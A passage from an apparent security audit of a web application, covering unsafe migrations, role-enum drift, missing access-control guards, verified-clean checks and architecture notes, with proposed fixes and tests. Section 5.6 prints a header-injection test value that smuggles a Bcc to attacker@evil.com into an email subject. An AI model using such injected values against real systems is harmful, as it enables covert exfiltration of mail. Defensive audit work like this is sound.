operator's laptop or in a password manager, never on either server.

**Option 2 — split the secret out of the bundle.** Exclude `.env` entirely and
require the operator to carry `ROOT_MASTER_KEK` by hand:

```bash
# ops/kubera-export.sh
  # Everything except the secrets. The root KEK and friends travel out-of-band so
  # a captured bundle is ciphertext without a key.
  grep -vE '^(ROOT_MASTER_KEK|JWT_SECRET_KEY|INTERNAL_API_KEY|POSTGRES_PASSWORD|REDIS_PASSWORD|SMTP_PASSWORD)=' \
    "$PWD/.env" > "$BUNDLE/env.public"
  chmod 600 "$BUNDLE/env.public"
  cat <<'EOF' > "$BUNDLE/SECRETS-REQUIRED.txt"
This bundle deliberately omits:
  ROOT_MASTER_KEK  JWT_SECRET_KEY  INTERNAL_API_KEY
  POSTGRES_PASSWORD  REDIS_PASSWORD  SMTP_PASSWORD
Transfer them out-of-band and add them to .env on the target before starting the
stack. Without ROOT_MASTER_KEK the vault cannot be decrypted — see
docs/SECURITY_HARDENING.md §6.
EOF
```

`kubera-import.sh` then verifies the required keys are present before
`start_stack`, and the KEK-fingerprint check it already performs
(`kubera-import.sh:145`) becomes the confirmation that the right key was supplied.
This is more operator friction but has the better failure mode.

**Option 3 (both, minimum viable) — shred on success and warn loudly.** Even
without encryption, make the window small:

```bash
cleanup_bundle() {
  if [ "${KEEP_BUNDLE:-0}" != "1" ] && [ -d "$BUNDLE" ]; then
    log "removing local bundle (contains .env + full vault)..."
    find "$BUNDLE" -type f -exec shred -u {} + 2>/dev/null || rm -rf "$BUNDLE"
    rm -rf "$BUNDLE"
  fi
}
trap cleanup_bundle EXIT
```
and have `--keep-bundle` print an explicit warning about what is being retained.

**Also:** `ops/kubera-import.sh:160` copies the bundled env over the target's
`.env`. If the target already had a *different* `ROOT_MASTER_KEK` and any local
data, that data becomes permanently unreadable. Add a guard:

```bash
if [ -f .env ] && ! cmp -s <(kek_of .env) <(kek_of "$BUNDLE/env"); then
  die "target .env has a DIFFERENT ROOT_MASTER_KEK. Overwriting it makes any existing
       vault content on this host permanently unreadable. Move it aside deliberately."
fi
```

#### Effort

Small for Option 1 or 3; the `age` dependency is one apt package.

---

<a name="kub-017"></a>
### KUB-017 — Non-transactional migrations + auto-migrate on container start

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Deployment safety / availability |
| **Locations** | `alembic/versions/cd98ce56a9c3_extend_company_user_roles_hierarchy.py:23-33`, `alembic/versions/a1f2b3c4d5e6_auditease_slice1.py:24`, `docker-compose.yml:85-86,78`, `alembic/env.py:41-44` |

#### What is wrong

##### (a) Two migrations break out of their transaction and are not idempotent

```python
# alembic/versions/cd98ce56a9c3_extend_company_user_roles_hierarchy.py:22-33
def upgrade() -> None:
    op.execute("COMMIT")
    op.execute("ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'manager'")
    op.execute("ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'employee'")

    op.add_column('company_users', sa.Column('manager_id', sa.UUID(), nullable=True))
    op.add_column('company_users', sa.Column('full_name', sa.String(length=255), server_default='Unknown', nullable=False))
    op.add_column('company_users', sa.Column('designation', sa.String(length=255), nullable=True))
    op.add_column('company_users', sa.Column('department', sa.String(length=255), nullable=True))
    op.add_column('company_users', sa.Column('is_active', sa.Boolean(), server_default='true', nullable=False))
    op.create_foreign_key('fk_company_users_manager_id', 'company_users', 'company_users', ['manager_id'], ['id'])
```

`ALTER TYPE ... ADD VALUE` genuinely cannot run inside a transaction block in
older PostgreSQL, so `op.execute("COMMIT")` is a recognised workaround. But it
commits **everything so far in the migration**, and the statements *after* it are
no longer covered by a rollback while `alembic_version` has not yet advanced.

The enum additions use `IF NOT EXISTS`. The five `add_column` calls and the
`create_foreign_key` do **not**. So if any statement after the `COMMIT` fails —
a lock timeout, a constraint violation on existing data, a killed container — the
columns are already applied, `alembic_version` still points at the parent, and
the retry dies with `DuplicateColumn`. Recovery requires manual SQL.

`a1f2b3c4d5e6_auditease_slice1.py:24` has the same shape.

##### (b) Migrations run automatically on every container start

```yaml
# docker-compose.yml:78,85-86
    restart: unless-stopped
    command: >
      sh -c "alembic upgrade head && uvicorn app.main:app --host 0.0.0.0 --port 8000"
```

Combined with (a): a half-applied migration means `alembic upgrade head` fails,
`&&` short-circuits, uvicorn never starts, the container exits, and
`restart: unless-stopped` restarts it — into the same failure. **A crash loop with
the API down and no operator gate.** There is no pre-migration backup step, no
dry-run, and no way to start the API without also migrating.

##### (c) No migration lock

`alembic/env.py:41-44` configures and runs migrations with no advisory lock:

```python
def do_run_migrations(connection):
    context.configure(connection=connection, target_metadata=target_metadata)
    with context.begin_transaction():
        context.run_migrations()
```

Two `api` containers starting simultaneously (`docker compose up -d --scale api=2`,
or an overlapping restart) both attempt the upgrade. For transactional migrations
PostgreSQL row locking on `alembic_version` mostly serialises this; for the
non-transactional ones in (a) it does not.

##### (d) Model/DB drift in the same migration

`create_foreign_key('fk_company_users_manager_id', ...)` specifies **no
`ondelete`**, while the model declares `ondelete="SET NULL"`:

```python
# app/models/company.py:106-108
    manager_id: Mapped[uuid.UUID | None] = mapped_column(
        UUID(as_uuid=True), ForeignKey("company_users.id", ondelete="SET NULL"), nullable=True
    )
```

`soft_delete_company_user` compensates by nulling reports manually
(`account_admin.py:104-106`), so nothing breaks today. But a genuine
`DELETE FROM company_users` — which `purge_company` triggers via the company
cascade — relies on the database behaving as the model claims. Tests using
`create_all` get `SET NULL`; production does not. See also
[KUB-018](#kub-018) for the enum half of this drift.

#### What is healthy (verified)

The migration chain itself is sound. Programmatic check across all 41 revisions:

```
total migrations: 41
ROOTS:  ['f4e8f5695f21']            # exactly one
HEADS:  ['ddf024af58cd']            # exactly one
BRANCH POINTS: {}                   # none
MISSING PARENTS: []                 # none
```

`alembic/env.py` also populates `target_metadata` correctly — importing
`app.models.company` executes `app/models/__init__.py`, which imports all 22
model modules, so `--autogenerate` sees the full schema and will not propose
dropping tables.

#### Proposed fix

**1. Take migrations out of the container start command:**

```yaml
# docker-compose.yml
  api:
    command: >
      sh -c "uvicorn app.main:app --host 0.0.0.0 --port 8000"

  # One-shot migration runner. Not started by `up`; invoked explicitly:
  #   docker compose run --rm migrate
  migrate:
    build: { context: ., dockerfile: Dockerfile }
    profiles: ["tools"]
    command: ["alembic", "upgrade", "head"]
    env_file: [.env]
    environment:
      DATABASE_URL: postgresql+asyncpg://${POSTGRES_USER}:${POSTGRES_PASSWORD}@postgres:5432/${POSTGRES_DB}
    networks: [data]
    depends_on:
      postgres:
        condition: service_healthy
```

and make the deploy sequence explicit in the runbook:

```bash
docker compose exec -T postgres pg_dump -U "$POSTGRES_USER" -Fc "$POSTGRES_DB" > pre-migrate.dump
docker compose run --rm migrate          # fails loudly, API keeps serving the old code
docker compose up -d --build api worker beat
```

Note the ordering benefit: the API stays up on the previous image while the
migration runs, so a failed migration is a no-op rather than an outage.

**2. Add an advisory lock in `alembic/env.py`:**

```python
def do_run_migrations(connection):
    # Serialise concurrent upgrades. Two API containers starting together would
    # otherwise both run `upgrade head`; the non-transactional migrations
    # (cd98ce56a9c3, a1f2b3c4d5e6) are not safe under that race.
    connection.exec_driver_sql("SELECT pg_advisory_lock(hashtext('kubera_alembic'))")
    try:
        context.configure(connection=connection, target_metadata=target_metadata)
        with context.begin_transaction():
            context.run_migrations()
    finally:
        connection.exec_driver_sql("SELECT pg_advisory_unlock(hashtext('kubera_alembic'))")
```

**3. Make the two non-transactional migrations idempotent.** They have already run
everywhere, so *editing* them is only about future replays (fresh environments,
CI, disaster recovery):

```python
def upgrade() -> None:
    # ALTER TYPE ... ADD VALUE cannot run inside a transaction block, so the
    # migration transaction is committed here. Everything AFTER this point is
    # therefore un-rolled-back on failure and must be individually idempotent.
    op.execute("COMMIT")
    op.execute("ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'manager'")
    op.execute("ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'employee'")

    op.execute("ALTER TABLE company_users ADD COLUMN IF NOT EXISTS manager_id UUID")
    op.execute("ALTER TABLE company_users ADD COLUMN IF NOT EXISTS full_name VARCHAR(255) NOT NULL DEFAULT 'Unknown'")
    op.execute("ALTER TABLE company_users ADD COLUMN IF NOT EXISTS designation VARCHAR(255)")
    op.execute("ALTER TABLE company_users ADD COLUMN IF NOT EXISTS department VARCHAR(255)")
    op.execute("ALTER TABLE company_users ADD COLUMN IF NOT EXISTS is_active BOOLEAN NOT NULL DEFAULT true")
    op.execute("""
        DO $$ BEGIN
            ALTER TABLE company_users
              ADD CONSTRAINT fk_company_users_manager_id
              FOREIGN KEY (manager_id) REFERENCES company_users(id) ON DELETE SET NULL;
        EXCEPTION WHEN duplicate_object THEN NULL;
        END $$;
    """)
```

Note this also repairs the missing `ON DELETE SET NULL` from (d). For an
already-migrated database, ship a *separate forward* migration:

```python
"""align manager_id FK with the model's ON DELETE SET NULL"""
def upgrade() -> None:
    op.drop_constraint("fk_company_users_manager_id", "company_users", type_="foreignkey")
    op.create_foreign_key("fk_company_users_manager_id", "company_users", "company_users",
                          ["manager_id"], ["id"], ondelete="SET NULL")
```

**4. Add a drift guard to CI**, so model/DB divergence is caught mechanically:

```python
# unit_tests/test_migration_drift.py
def test_no_pending_autogenerate_diff(alembic_config, sync_engine):
    """A model change without a migration (or vice versa) fails here rather than
    in production. See KUB-017(d) and KUB-018."""
    from alembic.autogenerate import compare_metadata
    from alembic.migration import MigrationContext
    from app.models.base import Base

    with sync_engine.connect() as conn:
        diff = compare_metadata(MigrationContext.configure(conn), Base.metadata)
    assert not diff, f"model/database drift: {diff}"
```

**5. Add a linear-history guard** (cheap, and the chain is currently clean):

```python
def test_migrations_have_exactly_one_head():
    from alembic.script import ScriptDirectory
    from alembic.config import Config
    heads = ScriptDirectory.from_config(Config("alembic.ini")).get_heads()
    assert len(heads) == 1, f"branched migration history: {heads}"
```

#### Effort

Small–medium. Item 1 is the important one and is pure configuration plus a runbook
edit.

---

<a name="kub-018"></a>
### KUB-018 — `UserRole` Python enum has drifted from the PostgreSQL enum

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Data integrity / availability |
| **Locations** | `app/models/company.py:80-83,101-105`, `alembic/versions/cd98ce56a9c3_extend_company_user_roles_hierarchy.py:24-25`, `app/auth.py:169-180`, `app/routers/users.py:142-153` |

#### What is wrong

The database enum has three values; the Python enum has two.

```sql
-- created by migration cd98ce56a9c3
ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'manager';
ALTER TYPE user_role ADD VALUE IF NOT EXISTS 'employee';
```
```python
# app/models/company.py:80-83 — 'manager' is gone
class UserRole(str, enum.Enum):
    admin = "admin"
    employee = "employee"
```

`SAEnum(UserRole, name="user_role")` (`app/models/company.py:102`) validates on
**load**. Any surviving row with `role = 'manager'` raises

```
LookupError: 'manager' is not among the defined enum values. Enum name: user_role.
Possible values: admin, employee
```

the moment SQLAlchemy hydrates it. No migration ever backfilled those rows.

#### Impact

For any tenant that used the manager role before it was removed:

- that user cannot log in — `company_login` (`app/routers/auth.py:407`) loads the row;
- `GET /api/v1/users` **fails entirely** for that company — one bad row breaks
  the whole list response for the admin;
- `_attach_uploader_names` and every other query that touches `company_users`
  fails the same way.

This is an availability bug that lands on the admin, is total rather than
partial, and produces an opaque 500. Whether any production row is affected
depends on deployment history — **check before assuming it is theoretical**:

```sql
SELECT company_id, count(*) FROM company_users WHERE role = 'manager' GROUP BY 1;
```

#### Related dead weight

The manager concept was removed from the code but its scaffolding remains, and the
names now actively mislead:

```python
# app/auth.py:177-178
require_admin = require_role(UserRole.admin)
require_manager_or_admin = require_role(UserRole.admin)   # identical to require_admin
```
```python
# app/auth.py:169-174
async def get_visible_user_ids(user, db: AsyncSession) -> list[uuid.UUID] | None:
    """Return all user IDs this user is allowed to see data for. None if admin (sees all)."""
    from app.models.company import UserRole
    if user.role == UserRole.admin:
        return None
    return [user.id]        # <- every non-admin sees only themselves
```

`get_direct_report_ids` is only ever reached via `require_manager_or_admin`, i.e.
only by admins, so `GET /api/v1/users/me/reports` returns an admin's direct
reports — usually an empty list, because `manager_id` is validated to point at an
*admin* (`users.py:96-105`).

None of this is a vulnerability — `require_manager_or_admin` is *more* restrictive
than its name implies, which is the safe direction. It is a comprehension hazard:
a future reader will reasonably assume a manager tier exists and is enforced.

#### Proposed fix

**Decide the intent first.** Two coherent outcomes:

##### Outcome A — the role model is genuinely flat (recommended, matches the code)

1. Backfill and constrain:
   ```python
   """collapse the removed 'manager' role into 'employee'"""
   def upgrade() -> None:
       # The Python UserRole enum dropped 'manager'; any row still carrying it
       # raises LookupError on load and breaks the whole /users listing.
       op.execute("UPDATE company_users SET role = 'employee' WHERE role = 'manager'")
       # 'manager' cannot be removed from a PostgreSQL enum without recreating the
       # type; a CHECK constraint prevents it being used again, which is enough.
       op.execute("""
           ALTER TABLE company_users
           ADD CONSTRAINT ck_company_users_role_supported
           CHECK (role IN ('admin', 'employee'))
       """)
   ```
2. Delete the misleading aliases:
   ```python
   # app/auth.py — remove
   require_manager_or_admin = require_role(UserRole.admin)
   async def get_direct_report_ids(...): ...
   ```
   and update the three importers (`users.py:16,19`, `kra.py:9`,
   `auditease.py:15`) to use `require_admin` directly.
3. Either delete `GET /api/v1/users/me/reports` or re-point it at
   `manager_id`-based reporting deliberately.
4. Simplify `get_visible_user_ids` to say what it does:
   ```python
   async def get_visible_user_ids(user, db) -> list[uuid.UUID] | None:
       """User IDs whose rows this principal may see. None means unrestricted.

       The role model is flat: admins see the whole company, everyone else sees
       only their own records. There is no manager tier — see KUB-018.
       """
   ```

##### Outcome B — the manager tier is wanted

Re-add `manager` to `UserRole`, give `require_manager_or_admin` a real
implementation (`require_role(UserRole.admin, UserRole.manager)`), and make
`get_visible_user_ids` return `[user.id, *direct_reports]` for managers. This is
more work and re-introduces a tier nothing currently uses; only choose it if the
product needs it.

#### Regression test

```python
def test_python_role_enum_matches_database_enum(sync_engine):
    """KUB-018: a value in the DB enum that the Python enum lacks is a load-time
    LookupError waiting to happen."""
    from app.models.company import UserRole
    with sync_engine.connect() as conn:
        db_values = {r[0] for r in conn.exec_driver_sql(
            "SELECT unnest(enum_range(NULL::user_role))::text")}
    python_values = {r.value for r in UserRole}
    unusable = db_values - python_values
    assert not unusable, (
        f"database enum has values the application cannot load: {sorted(unusable)}. "
        "Backfill the rows and add a CHECK constraint, or re-add the value to UserRole."
    )

async def test_no_rows_carry_an_unsupported_role(db):
    count = await db.scalar(text("SELECT count(*) FROM company_users WHERE role NOT IN ('admin','employee')"))
    assert count == 0
```

#### Effort

Small — one migration plus deletions. Run the diagnostic query first.

---

<a name="kub-019"></a>
### KUB-019 — `assets` module guard incomplete: depreciation and financial years unguarded

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Broken access control (OWASP A01) |
| **Locations** | `app/routers/depreciation.py`, `app/routers/financial_years.py`, `app/auth.py:180` |

#### What is wrong

`assets` is one of the two modules where server-side enforcement *was* completed —
`require_assets_module` guards 32 endpoints across `assets.py`,
`asset_masters.py`, `asset_acquisitions.py`, `asset_documents.py` and
`asset_reports.py`. But two routers operating on the same data have **no module
guard at all**:

| Router | Endpoints | Module guard |
|---|---|---|
| `depreciation` | 8 | **none** |
| `financial-years` | 4 | **none** |

Neither module id appears in `MODULE_DEFINITIONS`
(`frontend/src/auth/company/modules.ts`), because in the UI these live under the
Assets section — which means the *intended* gate is `assets`, and it is missing.

So a user without the `assets` grant, who is correctly blocked from
`GET /api/v1/assets`, can still call:

- `GET /api/v1/depreciation/runs/{run_id}/lines` → `AssetDepreciationLineResponse`
  per asset: opening WDV, depreciation charged, closing WDV;
- `GET /api/v1/depreciation/runs/{run_id}/it-lines` → block-level Income Tax
  depreciation;
- `POST /api/v1/depreciation/explain` → the full calculation trace;
- `GET /api/v1/financial-years` → the company's accounting periods;

and, per [KUB-008](#kub-008), *mutate* those records too.

#### Impact

The `assets` module restriction is bypassable for read access to per-asset
financial data through a sibling router. Because it is the one module where the
gate was believed complete, this is the gap most likely to be assumed closed.

#### Proposed fix

Fold into the [KUB-001](#kub-001) change:

```python
# app/routers/depreciation.py
from app.auth import require_assets_module
router = APIRouter(
    prefix="/api/v1/depreciation",
    tags=["depreciation"],
    dependencies=[Depends(require_assets_module)],
)

# app/routers/financial_years.py
router = APIRouter(
    prefix="/api/v1/financial-years",
    tags=["financial-years"],
    dependencies=[Depends(require_assets_module)],
)
```

Then extend the KUB-001 regression test's `GATED_ROUTES` map:

```python
GATED_ROUTES = {
    ...
    "/api/v1/depreciation": "assets",
    "/api/v1/financial-years": "assets",
    "/api/v1/asset-reports": "assets",
    "/api/v1/asset-masters": "assets",
    "/api/v1/asset-acquisitions": "assets",
    "/api/v1/asset-documents": "assets",
    "/api/v1/assets": "assets",
}
```

so any new asset-family router without the gate fails CI.

**Design note.** Rather than remembering to add the dependency to each new router,
consider inverting the default: register routers through a helper that *requires*
a module id (or an explicit `module=None` for the deliberately public ones like
`health` and `auth`). That makes "forgot the gate" a startup error instead of a
silent hole:

```python
# app/routers/__init__.py
def tenant_router(prefix: str, *, module: str | None, tags: list[str]) -> APIRouter:
    """Every tenant-facing router declares its module. `module=None` is allowed but
    must be deliberate — it is what KUB-001 was."""
    deps = [Depends(require_module(module))] if module else []
    return APIRouter(prefix=prefix, tags=tags, dependencies=deps)
```

#### Effort

Very small — two lines, folded into KUB-001.

---

## 5. Verified clean

Negative results, recorded so they are not re-investigated and so the basis for
each conclusion is on record.

### 5.1 SQL injection — none found

Every query in `app/` uses SQLAlchemy Core/ORM constructs with bound parameters.
The complete set of `text()` usages:

| Location | Content | Assessment |
|---|---|---|
| `app/models/depreciation.py:46` | `text("status = 'finalized'")` | static index predicate |
| `app/models/auditease.py:196` | static JSONB `server_default` | static |
| `app/routers/health.py:17` | `text("SELECT 1")` | static |
| `ops/kubera-rotate-root-kek.py:81,131` | parameterised `text()` with bind params | safe |

No f-string, `%`, or `.format()` interpolation into any SQL construct
(`grep -rnE "(select\|SELECT\|WHERE\|order_by)\(?f\""` → no matches). No dynamic
`order_by` from user input. Search endpoints (`docvault.py:546`) bind the ILIKE
term rather than interpolating it. The `{kind}` path parameter at
`asset_masters.py:347` is checked against an allowlist (`_IMPACT_KINDS`) before
use.

### 5.2 Path traversal — none found

Every filesystem write derives its path from server-generated UUIDs:

| Path construction | Location |
|---|---|
| `{VAULT_STORAGE_PATH}/{company_id}/{uuid4}.enc` | `docvault.py:355-358` |
| `{VAULT_STORAGE_PATH}/users/{user_id}/avatar_{uuid4}.{ext}.enc` | `users.py:267-269` |
| `{VAULT_STORAGE_PATH}/{company_id}/logo_{uuid4}.{ext}.enc` | `company.py:144-146` |
| `{BACKUP_PATH}/db_backup_{timestamp}.dump` | `worker.py:107` |

`file.filename` is stored as metadata (`original_filename`) and used to select a
parser by extension (`load_sheet(file.filename, content)`), never to build a path.
`{ext}` in the avatar/logo paths comes from `detect_image_format` /
`LOGO_TYPES`, both closed sets. The one place a DB-sourced path is passed to
`unlink` (`app/routers/auth.py:379-386`) is operator-only and guarded by a `vault_dir not in
file.parents` check.

### 5.3 CSRF — not applicable by architecture

Verified exhaustively: `grep -rn "set_cookie\|Cookie\|cookie" app/` returns
**zero matches**. The API never sets or reads a cookie. Authentication is
`Authorization: Bearer` sourced from `localStorage`
(`frontend/src/auth/tokenStorage.ts`, `frontend/src/api/http.ts:102`).

Browsers do not attach `Authorization` headers automatically, so a cross-site
request arrives unauthenticated. **CSRF tokens would be dead weight here** —
there is no ambient credential to forge with. See §6.1 for the trade-off this
implies.

One cleanup: `allow_credentials=True` (`main.py:34`) is unnecessary, since there
are no credentials for the browser to send. Setting it to `False` also removes
the failure mode where a future `allow_origins=["*"]` becomes dangerous — the
scenario the comment block at `main.py:22-30` was written about.

### 5.4 Report rendering — not an XSS vector

`frontend/src/pages/company/auditease/ReportsTab.tsx:456` uses
`dangerouslySetInnerHTML`, which was investigated as a likely stored-XSS sink. It
is safe:

```python
# app/services/reporting/pdf.py:61-66
    env = Environment(
        loader=FileSystemLoader(template_dir),
        autoescape=select_autoescape(["html", "xml"]),
    )
```

Autoescaping is on for `report.html` / `pack.html` / `base.html` / `_macros.html`,
and `grep -rn "|safe\|Markup\|{% autoescape"` across
`app/services/reporting/` and `app/services/email/` returns **no matches**. Tenant
data reaching the template is escaped.

This is safe by a single mechanism with no defence in depth: one `|safe` added
later, on any field, becomes immediate XSS on the app origin, with no CSP to
contain it. Worth a comment in `report.html` recording why `|safe` must not be
introduced.

### 5.5 SSRF via report rendering — no reachable sink

`weasyprint.HTML(string=html_str)` would fetch external resources referenced by
`<img src>`, `@import`, or `url()`. There are **none** in the templates
(`grep -n "src=\|url(\|@import\|href=" app/services/reporting/templates/*.html`
→ no matches), and autoescaping prevents tenant data from introducing one.

The backend has **no HTTP client at all** — no `requests`, `httpx`, `aiohttp`, or
`urllib.request` import anywhere in `app/`. The only outbound network capability
is SMTP, which is [KUB-006](#kub-006).

### 5.6 Email header injection — blocked by the runtime

`build_mime_message` assigns tenant-influenced values directly to headers
(`client.py:121-133`), and `auditease.py:1126` builds
`subject = f"Audit Invitation: {company_name} — {eng.period_label}"` from
admin-controlled strings. Tested on the project's Python 3.12:

```
email.errors.HeaderWriteError: folded header contains newline:
b'Subject: Audit Invitation: Evil\r\nBcc: attacker@evil.com\r\nX-Injected: yes\r\n'
```

Python 3.12's generator raises rather than folding, so **no injection**. Residual
effect is availability: a `\r\n` in a company name or period label makes that
invite email raise inside the Celery task. `HeaderWriteError` is not in the
task's `autoretry_for` tuple (`tasks.py:89`), so it fails once and stops —
correct behaviour, but the company admin gets no feedback because the caller
wraps dispatch in a bare `except Exception` that only logs (`auditease.py:1157`).
Consider validating `Company.name` and `period_label` against control characters
on write.

### 5.7 HTTP response splitting — blocked by the server

See [KUB-010](#kub-010). Both h11 and uvicorn's httptools implementation reject
CRLF in outbound header values. Reproduced; commands in Appendix C.

### 5.8 Tenant scoping — consistent, no IDOR found

All 214 endpoints were reviewed for tenant scoping. Every tenant-owned query
filters on `company_id` (or reaches it through an owned parent). Representative
helpers:

- `_get_owned_engagement`, `_owned_requirement`, `_visible_group`, `_get_owned_group`
  (`auditease.py:55,487,498,1368`)
- `check_auditor_access` (`auditor_engagements.py:40`) — applied uniformly across
  all 22 auditor endpoints, with per-area permission checks
- `_load_category_for_write`, `_asset_bucket`, `_verify_document`
  (`asset_masters.py:124`, `asset_documents.py:106`)

The one endpoint flagged by automated analysis as "path ID with no company
scoping" — `PATCH /api/v1/notifications/{notification_id}/read` — is correctly
scoped on `recipient_id == user.id` (`notifications.py:45-51`), which is the right
predicate for a table that has no `company_id`. False positive.

### 5.9 Cryptographic construction — sound

| Property | Implementation | Assessment |
|---|---|---|
| Cipher | AES-256-GCM (`AESGCM`, `cryptography`) | authenticated, appropriate |
| Key hierarchy | root KEK → per-company KEK → per-file DEK | correct envelope design |
| Key generation | `os.urandom(32)` | CSPRNG |
| Nonce generation | `os.urandom(12)` fresh per operation | no reuse; 96-bit GCM nonce is correct |
| Nonce storage | prepended to ciphertext on disk | unambiguous framing |
| Password hashing | bcrypt with `gensalt()` per password | appropriate |
| Token signing | HS256 with a ≥32-char validated secret | appropriate for a single-service deployment |
| Secret comparison | `secrets.compare_digest` (`app/routers/auth.py:58`, `leads.py:32`) | constant-time |
| Activation keys | `secrets.token_urlsafe(24)`, bcrypt-hashed, 48h TTL, one-shot | well designed |
| Tamper detection | `InvalidTag` → `CompanyKeyDecryptionError` with an actionable message and a 500 handler (`main.py:64-70`) | good operator experience |
| Key rotation | `ops/kubera-rotate-root-kek.py` with a dry-run mode | present and documented |

No custom cryptography, no ECB, no static IVs, no `random` module for
security-relevant values. The weaknesses are all *around* the crypto — weak
passwords feeding into it ([KUB-004](#kub-004)), backups that route around it
([KUB-015](#kub-015)), and bundles that ship the key with the ciphertext
([KUB-016](#kub-016)).

### 5.10 Container and network hardening — largely correct

Verified in `docker-compose.yml`:

- `caddy` is the only service publishing to a wildcard address; `api` publishes to
  `127.0.0.1` only; `postgres` and `redis` publish nothing.
  `unit_tests/test_compose_exposure.py` enforces this.
- `security_opt: no-new-privileges:true` on all seven services.
- `cap_drop: ALL` on api/worker/beat/frontend/gateway/caddy, with a minimal
  `cap_add` where nginx genuinely needs it, and the reason recorded empirically
  (`docker-compose.yml:210-213`).
- Non-root uid 10001 with data directories chowned before volume attachment
  (`Dockerfile:28-31`) — including the subtle detail that Docker copies image-path
  ownership into a new named volume.
- Network segmentation: `edge` (caddy→gateway→api/frontend) and `data`
  (api/worker/beat→postgres/redis). `caddy`, `gateway` and `frontend` have no
  route to `data`.
- Redis `requirepass` is mandatory via `${REDIS_PASSWORD:?...}`, with
  `maxmemory-policy noeviction` and the reasoning recorded.
- Memory limits on every service, sized deliberately for a 4 GB host.
- Health checks on postgres, redis, api, frontend, gateway with correct
  `depends_on: condition: service_healthy` ordering.
- `.dockerignore` excludes `.env`, `.env.*` (re-including only `.env.example`),
  `data/`, `.tmp_vault/`, `.vault_dev/`, migration bundles, dumps, `.git`, and the
  compose override, with `unit_tests/test_dockerignore_covers_secrets.py`
  guarding against drift.
- `git ls-files` confirms **no secrets are tracked** — only `.env.example`, which
  contains placeholders that `config.py` refuses to boot with.

### 5.11 Startup secret validation — works

`Settings._reject_insecure_secrets` (`config.py:95-139`) refuses to start on
placeholder or short secrets for `JWT_SECRET_KEY`, `INTERNAL_API_KEY`,
`ROOT_MASTER_KEK`, `DATABASE_URL` and all three Redis URLs. Verified loading the
real `.env`: all secrets are correctly sized (JWT 64, KEK 64 hex, internal key 64,
Postgres 48, Redis 64) and `Settings()` constructs successfully.

### 5.12 FastAPI docs not publicly reachable

`docs_url="/docs"` and `redoc_url="/redoc"` are enabled (`main.py:18-19`), but
`gateway/modes/app.conf` routes only `/api/` to the API — `/docs`, `/redoc` and
`/openapi.json` fall through `location /` to the frontend and return the SPA
shell. They are reachable on `127.0.0.1:8000`; see [KUB-L08](#kub-l08).

---

## 6. Architectural assessment

### 6.1 Session architecture: the CSRF/XSS trade-off

The choice of `Authorization: Bearer` + `localStorage` over `httpOnly` cookies is
a coherent one, and it has been implemented consistently — namespaced storage per
identity (`kubera.company.tokens` / `kubera.auditor.tokens`) so a company session
and an auditor session cannot clobber each other, and separate `HttpClient`
instances with separate refresh paths.

The trade-off it makes:

| | Cookie sessions | Bearer + localStorage (current) |
|---|---|---|
| CSRF | Requires tokens or `SameSite` | **Not applicable** ✅ |
| XSS steals the session | `httpOnly` prevents it | **Any XSS = full takeover** ❌ |
| Revocation | Server-side session store, natural | Requires deliberate design — **absent** ([KUB-005](#kub-005)) ❌ |
| Mobile / non-browser clients | Awkward | Natural ✅ |

The decision is defensible. What is not defensible is taking the CSRF win without
paying for the XSS exposure it creates. The two mitigations that make this design
safe are both missing:

1. **A Content-Security-Policy** — absent (`SECURITY_HARDENING.md` §10.6).
2. **Session revocation** — absent ([KUB-005](#kub-005)).

Fix those two and the architecture is sound as chosen. Until then, every XSS
finding in this report should be read as "full account takeover, unrevocable for
7 days", which is why [KUB-009](#kub-009) is worth fixing despite currently being
latent.

### 6.2 The authorization model has the right pieces, unevenly applied

Three layers exist and each is individually well built:

1. **Tenant isolation** — `company_id` filtering. **Applied consistently.** No
   gaps found across 214 endpoints.
2. **Role gates** — `require_admin`. Applied to 40 endpoints, mostly correctly,
   with the inconsistencies in [KUB-008](#kub-008).
3. **Module gates** — `require_module`. Applied to 56 of the ~110 endpoints that
   need it ([KUB-001](#kub-001), [KUB-019](#kub-019)).

The pattern to generalise is the one `compliance.py` uses: declare the gate at
router construction so it cannot be omitted on a new endpoint. The
`tenant_router` helper sketched in [KUB-019](#kub-019) would make omission a
startup error rather than a silent hole.

A fourth layer — **object-level ownership** — is largely absent. `update_document`
([KUB-007](#kub-007)) is the clearest case: bucket access is treated as write
authority. "Can see" and "can change" should be distinct predicates.

### 6.3 Defence in depth is thin at the edge

The network hardening is genuinely good (§5.10) but stops at the transport layer.
Above it:

| Control | State |
|---|---|
| TLS, HSTS | ✅ Caddy, with a considered localhost exception |
| `X-Frame-Options`, `nosniff`, `Referrer-Policy`, COOP | ✅ Caddy |
| `Content-Security-Policy` | ❌ absent |
| `Permissions-Policy` | ❌ absent |
| Request rate limiting | ❌ absent at the edge ([KUB-003](#kub-003)) |
| Request body limits | ❌ `client_max_body_size 0` (deferred) |
| Request timeouts | ⚠️ 300s read/send — generous |
| WAF / bot mitigation | ❌ none |

The single highest-value addition is a CSP, because it partially mitigates
[KUB-009](#kub-009), [KUB-012](#kub-012), and the `dangerouslySetInnerHTML`
fragility in §5.4 simultaneously.

### 6.4 What is notably well done

Worth recording, because a findings list distorts the picture:

- **The hardening work in `SECURITY_HARDENING.md` is real** and unusually
  honest — §10 "Known limitations" is specific about what is *not* covered,
  including the CSP and MIME/filename issues re-examined here. That section is
  why this audit could distinguish new findings from accepted risk.
- **Tests encode security invariants**, not just behaviour:
  `test_compose_exposure.py`, `test_dockerignore_covers_secrets.py`,
  `test_config_secrets.py`, `test_deployment_hardening.py`. This is the right
  instinct and should be extended with the regression tests proposed here.
- **Comments explain *why*, including failures.** `Dockerfile:19-31` on volume
  ownership, `worker.py:41-51` on `pg_dump` and the `+asyncpg` suffix,
  `docker-compose.yml:210-213` on nginx capabilities determined empirically,
  `Caddyfile:6-11` on choosing XFO over `frame-ancestors`. This materially
  reduces the risk of a future change silently undoing a fix.
- **The crypto is correct and was not over-engineered** (§5.9).
- **Tenant isolation is airtight** (§5.8) — the hardest thing to get right in a
  multi-tenant product, and there were no gaps.
- **`account_admin.purge_company`** demonstrates real care about referential
